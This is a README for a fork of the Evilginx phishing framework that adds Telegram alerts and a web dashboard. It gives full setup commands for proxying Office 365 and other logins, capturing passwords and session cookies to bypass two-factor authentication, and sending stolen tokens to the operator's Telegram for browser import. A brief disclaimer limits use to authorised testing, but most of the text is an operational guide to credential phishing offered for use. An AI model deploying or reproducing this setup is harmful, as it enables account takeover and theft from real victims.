```markdown
<p align="center">
  <img src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/logo.png" alt="Evilginx2 Logo" width="200"/>
</p>

<h1 align="center">🦊 Evilginx3 — Telegram Edition</h1>
<p align="center">
  <strong>Man-in-the-Middle Attack Framework with 2FA Bypass & Real-Time Telegram Alerts</strong>
</p>

<p align="center">
  <a href="https://t.me/officialmonsterz"><img src="https://img.shields.io/badge/Telegram-@officialmonsterz-26A5E4?style=flat-square&logo=telegram" alt="Telegram"></a>
  <a href="mailto:shapads@tutamail.com"><img src="https://img.shields.io/badge/Email-shapads@tutamail.com-red?style=flat-square&logo=mail.ru" alt="Email"></a>
  <a href="https://github.com/officialmonsterz/evilginx2"><img src="https://img.shields.io/badge/GitHub-officialmonsterz/evilginx2-181717?style=flat-square&logo=github" alt="GitHub"></a>
  <a href="https://github.com/officialmonsterz/evilginx2/blob/master/LICENSE"><img src="https://img.shields.io/badge/License-BSD%203--Clause-blue?style=flat-square" alt="License"></a>
  <img src="https://img.shields.io/badge/Version-3.3.0-brightgreen?style=flat-square" alt="Version">
  <img src="https://img.shields.io/badge/Go-1.22-00ADD8?style=flat-square&logo=go" alt="Go">
</p>

---

<p align="center">
  <img src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/screen.png" alt="Evilginx2 Console" width="700"/>
</p>

---

## 📋 Table of Contents

- [What Is Evilginx3?](#-what-is-evilginx3)
- [Why This Fork?](#-why-this-fork)
- [Feature Comparison](#-feature-comparison)
- [Quick Start](#-quick-start)
- [Core Features](#-core-features)
- [Telegram Integration](#-telegram-integration)
- [Web Dashboard](#-web-dashboard)
- [Docker Support](#-docker-support)
- [Screenshots](#-screenshots)
- [Disclaimer](#-disclaimer)
- [Support](#-support)

---

## 🧠 What Is Evilginx3?

**Evilginx3** is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows bypassing **2-factor authentication protection**.

This tool is a successor to [Evilginx](https://github.com/kgretzky/evilginx), released in 2017, which used a custom version of nginx HTTP server to provide man-in-the-middle functionality. The present version is fully written in **Go** as a standalone application, implementing its own HTTP and DNS server, making it extremely easy to set up and use.

### How It Works

```
Victim's Browser ──► Evilginx3 ──► Real Website (e.g., Office 365, Google)
                          │
                          ▼
                ┌─────────────────────┐
                │  Captures:          │
                │  ✓ Username/Email   │
                │  ✓ Password         │
                │  ✓ Session Cookies  │
                │  ✓ 2FA Tokens       │
                └──────────┬──────────┘
                           │
              ┌────────────┴────────────┐
              ▼                         ▼
    ┌──────────────────┐    ┌──────────────────────┐
    │  Telegram Alert   │    │   Web Dashboard      │
    │  (instant notify) │    │   (view & export)    │
    └──────────────────┘    └──────────────────────┘
```

---

## ⚡ Why This Fork?

This fork by **[@officialmonsterz](https://t.me/officialmonsterz)** takes the already powerful Evilginx3 and supercharges it with features that penetration testers actually need in real engagements.

### What Makes This Fork Different?

| Aspect | Original Evilginx3 | This Fork (Telegram Edition) |
|---|---|---|
| **Notifications** | ❌ None — must manually check CLI | ✅ **Real-time Telegram alerts** with captured credentials |
| **Token Delivery** | ❌ No file export | ✅ **Tokens attached as `.txt` files** in Telegram messages |
| **Message Updates** | ❌ N/A | ✅ **Auto-edits existing message** if more tokens arrive (no duplicates) |
| **Web Dashboard** | ❌ CLI only | ✅ **Full web UI** at port 5000 with search, filter, export & dark mode |
| **Async Processing** | ❌ Blocking operations | ✅ **Non-blocking notification queue** (buffered channel pattern) |
| **Database** | ❌ Plain text logs | ✅ **BuntDB embedded database** — zero config, no SQL needed |
| **Docker Build** | ❌ Single-stage, large image | ✅ **Multi-stage Alpine build** — only ~18MB final image |
| **Session Export** | ❌ Manual | ✅ **CSV/JSON export** for reporting |
| **Session Management** | ❌ No delete/cleanup | ✅ **Delete sessions** from dashboard or API |
| **Port Conflict Fix** | ❌ Must manually kill processes | ✅ **Documented resolution** for `systemd-resolved` conflicts |

---

## 📊 Feature Comparison

### Original vs This Fork — Detailed Breakdown

```
Feature                     Original Evilginx3          Telegram Edition (This Fork)
─────────────────────────────────────────────────────────────────────────────────────
MITM Proxy Engine           ✅ Same                     ✅ Same (enhanced)
SSL/Autocert                ✅ Same                     ✅ Same
Phishlet System             ✅ Same                     ✅ Same
DNS Server                  ✅ Same                     ✅ Same
─────────────────────────────────────────────────────────────────────────────────────
Telegram Notifications      ❌ Not available             ✅ NEW — Real-time alerts
Token File Attachments      ❌ Not available             ✅ NEW — .txt files in Telegram
Auto-Update Messages        ❌ Not available             ✅ NEW — Edits existing message
Async Notification Queue    ❌ Not available             ✅ NEW — Non-blocking
Web Dashboard               ❌ Not available             ✅ NEW — Port 5000
BuntDB Database             ❌ Not available             ✅ NEW — Embedded storage
CSV/JSON Export             ❌ Not available             ✅ NEW — One-click export
Session Search/Filter       ❌ Not available             ✅ NEW — Search by any field
Dark Mode UI                ❌ Not available             ✅ NEW — Toggleable dark mode
Dashboard Auth              ❌ Not available             ✅ NEW — Username/password
Docker (Multi-stage)        ❌ Single-stage              ✅ NEW — 18MB Alpine image
─────────────────────────────────────────────────────────────────────────────────────
```

### Why You Should Use This Fork

| Reason | Explanation |
|---|---|
| 🚀 **Instant Results** | Credentials hit your Telegram **within seconds** of capture — no more refreshing CLI |
| 📎 **Portable Tokens** | Tokens are saved as `.txt` files that you can import into **any browser** with EditThisCookie |
| 🔄 **No Notification Spam** | If more tokens are captured, the **same Telegram message is updated** — not a new message |
| 📊 **Professional Reporting** | Export sessions as CSV/JSON for your penetration test reports |
| 🛡️ **Built for Red Teams** | Dashboard + Telegram = monitor multiple campaigns from anywhere |
| 🐳 **Deploy Anywhere** | Docker image works on any Linux server in seconds |
| 🔧 **Zero Extra Config** | No MySQL, no Redis, no Nginx — just one binary and it runs |

---

## 🚀 Quick Start

### Prerequisites

- Ubuntu 20.04+ / Debian 11+ VPS
- A registered domain
- A Cloudflare account (free tier)
- A Telegram account

### One-Line Install

```bash
sudo apt update && sudo apt install wget curl git make build-essential ufw -y
```

### Step 1: Install Go 1.22.5

```bash
cd ~
wget https://go.dev/dl/go1.22.5.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.22.5.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc
go version
```

### Step 2: Clone & Build

```bash
cd ~
git clone https://github.com/officialmonsterz/evilginx2.git
cd evilginx2
go mod tidy
go build -o evilginx2 .
chmod +x evilginx2
```

### Step 3: Configure Firewall

```bash
sudo ufw allow 22/tcp
sudo ufw allow 53/udp
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw allow 5000/tcp
sudo ufw --force enable
```

### Step 4: Fix DNS Conflict

```bash
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved
sudo rm -f /etc/resolv.conf
echo "nameserver 1.1.1.1" | sudo tee /etc/resolv.conf
echo "nameserver 1.0.0.1" | sudo tee -a /etc/resolv.conf
sudo chattr +i /etc/resolv.conf
```

### Step 5: Run Evilginx3 with Dashboard

```bash
./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass1234
```

### Step 6: Basic Configuration

Inside the Evilginx console (`:` prompt), run:

```
: config domain yourdomain.com
: config ipv4 external YOUR_SERVER_IP
: config autocert on
: config unauth_url https://www.google.com
: config teletoken YOUR_BOT_TOKEN
: config chatid YOUR_CHAT_ID
```

### Step 7: Enable a Phishlet

```
: phishlets hostname office365 yourdomain.com
: phishlets enable office365
: lures create office365
: lures get-url 0
```

> **Full deployment guide available in [`DEPLOYMENT.md`](DEPLOYMENT.md)**

---

## ✨ Core Features

### Man-in-the-Middle Proxy

Evilginx3 acts as a **reverse proxy** between the victim and the real website. Every request from the victim is forwarded to the legitimate site, and the response is modified in real-time to:

- Replace domain names in HTML/JS/CSS with your phishing domain
- Capture **form submissions** (username/password)
- Intercept **Set-Cookie headers** (session tokens)
- Inject **JavaScript** for dynamic redirects
- Apply **sub-filters** to replace specific content patterns

### 2FA Bypass

The key feature of Evilginx3 is its ability to bypass **Two-Factor Authentication (2FA)** by capturing:

- **Session cookies** — The `Set-Cookie` headers from the real website
- **Bearer tokens** — OAuth/OpenID tokens from response bodies
- **HTTP header tokens** — Authorization headers

Once captured, these tokens can be imported into a browser to access the victim's account without needing the 2FA code.

### Automatic SSL Certificates

Evilginx3 uses **Let's Encrypt** via `certmagic` to automatically obtain and renew SSL/TLS certificates for your phishing domains. No manual certificate management required.

---

## 📱 Telegram Integration

The flagship feature of this fork — **instant notifications** when credentials are captured.

### What You Get

```
✨ Session Information ✨

👤 Username: victim@example.com
🔑 Password: SuperSecret123!
🌐 Landing URL: https://login.yourdomain.com/abc123
🖥️ User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
🌍 Remote Address: 203.0.113.42
🕒 Created: 1780014345

📦 Tokens are attached as a separate file.
```

### Key Features

| Feature | Behavior |
|---|---|
| **First Capture** | Sends a new message with credentials + token `.txt` attachment |
| **Subsequent Captures** | **Edits the same message** — no duplicate notifications |
| **Token File** | `.txt` file with formatted JSON cookies, compatible with browser import tools |
| **Async Delivery** | Notification queue processes in background — never blocks the proxy |

---

## 📊 Web Dashboard

Access your captured sessions from any browser at `http://YOUR_SERVER_IP:5000`

### Dashboard Features

```
┌─────────────────────────────────────────────────────────────┐
│  🦊 Evilginx2 Dashboard              Dark Mode  🔄 Auto    │
│  Telegram Edition by @officialmonsterz                     │
├─────────────────────────────────────────────────────────────┤
│  ┌───────┐  ┌───────┐  ┌───────┐                          │
│  │  42   │  │   3   │  │  20   │                          │
│  │ Total │  │Unique │  │Display│                          │
│  └───────┘  └───────┘  └───────┘                          │
│                                                             │
│  [Search...]          [All Phishlets ▼]                    │
│                                                             │
│  [📥 Export CSV] [📥 Export JSON] [🔄 Refresh]            │
│                                                             │
│  ┌────┬──────────┬──────────────┬──────────┬─────────┐    │
│  │ ID │ Phishlet │   Username   │ Password │   IP    │    │
│  ├────┼──────────┼──────────────┼──────────┼─────────┤    │
│  │ 1  │ office365│ user@corp.com│ Pass123! │203.0.113│    │
│  │ 2  │ google   │ admin@test.co│ Secret99 │198.51.10│    │
│  └────┴──────────┴──────────────┴──────────┴─────────┘    │
└─────────────────────────────────────────────────────────────┘
```

### API Endpoints

| Endpoint | Method | Purpose |
|---|---|---|
| `/api/sessions` | GET | List sessions (supports `?search=`, `?phishlet=`, `?limit=`, `?offset=`) |
| `/api/sessions/export` | GET | Export as CSV (`?format=csv`) or JSON (`?format=json`) |
| `/api/sessions/{id}` | GET | Get single session details |
| `/api/sessions/{id}` | DELETE | Delete a session |

---

## 🐳 Docker Support

Multi-stage Docker build produces a minimal **~18MB Alpine-based image**.

### Build & Run

```bash
# Build the image
docker build -t evilginx2-telegram .

# Run the container
docker run -d \
  --name evilginx2 \
  --restart unless-stopped \
  -p 53:53/udp \
  -p 80:80 \
  -p 443:443 \
  -p 5000:5000 \
  -v evilginx-data:/home/evilginx/.evilginx \
  evilginx2-telegram \
  -dashboard 0.0.0.0:5000 \
  -dashboard-user admin \
  -dashboard-pass mypass1234
```

### Docker Compose

```yaml
version: '3.8'
services:
  evilginx2:
    build: .
    container_name: evilginx2
    restart: unless-stopped
    ports:
      - "53:53/udp"
      - "80:80"
      - "443:443"
      - "5000:5000"
    volumes:
      - evilginx-data:/home/evilginx/.evilginx
    command: >
      -dashboard 0.0.0.0:5000
      -dashboard-user admin
      -dashboard-pass mypass1234

volumes:
  evilginx-data:
```

---

## 🖼️ Screenshots

### Terminal Console

```
                                             ___________      __ __           __
                                             \_   _____/__  _|__|  |    ____ |__| ____ ___  ___
                                              |    __)_\  \/ /  |  |   / __ \|  |/    \\  \/  /
                                              |        \\   /|  |  |__/ /_/  >  |   |  \>    <
                                             /_______  / \_/ |__|____/\___  /|__|___|  /__/\_ \
                                                     \/              /_____/         \/      \/

                                                        - --  Community Edition  -- -

                                               by Kuba Gretzky (@mrgretzky)     version 3.3.0
```

### Telegram Notification

<p align="center">
  <img src="https://private-user-images.githubusercontent.com/90621612/388448526-a102ecd7-e342-44c4-bff5-3004d16c0df4.png" alt="Telegram Notification Example" width="400"/>
</p>

> *Telegram notification showing captured credentials with token file attachment*

---

## 📚 Full Documentation

For **complete, step-by-step deployment instructions**, see:

- **[`DEPLOYMENT.md`](DEPLOYMENT.md)** — Full guide from zero to production
- **[`CHANGELOG`](CHANGELOG)** — Version history and release notes
- **[`Makefile`](Makefile)** — Build helper commands

---

## 🧑‍🏫 Evilginx Training Course

> 🔥 *Master Evilginx with the complete training course covering phishlet creation, advanced deployment, and real-world red team techniques.*

[Contact @officialmonsterz on Telegram](https://t.me/officialmonsterz) for course details.

---

## ⚖️ Disclaimer

I am fully aware that Evilginx can be used for nefarious purposes. This work is merely a demonstration of what adept attackers can do. It is the **defender's responsibility** to take such attacks into consideration and find ways to protect their users against this type of phishing attacks.

**Evilginx should be used only in legitimate penetration testing assignments with written permission from the parties being tested.**

Unauthorized use of this tool is illegal and unethical. The author and contributors assume no liability for misuse.

---

## 👏 Credits

| Contribution | Author | Contact |
|---|---|---|
| **Telegram Integration, Dashboard, Database, Docker** | [@officialmonsterz](https://t.me/officialmonsterz) | [GitHub](https://github.com/officialmonsterz) / [Telegram](https://t.me/officialmonsterz) / `shapads@tutamail.com` |
| **Original Evilginx2/3 (Core Framework)** | Kuba Gretzky ([@mrgretzky](https://github.com/kgretzky)) | [kgretzky/evilginx2](https://github.com/kgretzky/evilginx2) |

Big thanks to **Kuba Gretzky** for creating such a great tool and making it open source.

---

## 💬 Support

- **Telegram:** [t.me/officialmonsterz](https://t.me/officialmonsterz)
- **Email:** `shapads@tutamail.com`
- **GitHub Issues:** [github.com/officialmonsterz/evilginx2/issues](https://github.com/officialmonsterz/evilginx2/issues)
- **Repository:** [github.com/officialmonsterz/evilginx2](https://github.com/officialmonsterz/evilginx2)

---

<p align="center">
  <sub>Created with ❤️ by <a href="https://t.me/officialmonsterz">@officialmonsterz</a></sub>
  <br>
  <sub>Special thanks to the entire Evilginx community for their contributions and support.</sub>
</p>

<p align="center">
  <a href="https://github.com/officialmonsterz/evilginx2"><img src="https://img.shields.io/github/stars/officialmonsterz/evilginx2?style=social" alt="GitHub Stars"></a>
  <a href="https://github.com/officialmonsterz/evilginx2/network/members"><img src="https://img.shields.io/github/forks/officialmonsterz/evilginx2?style=social" alt="GitHub Forks"></a>
</p>
```
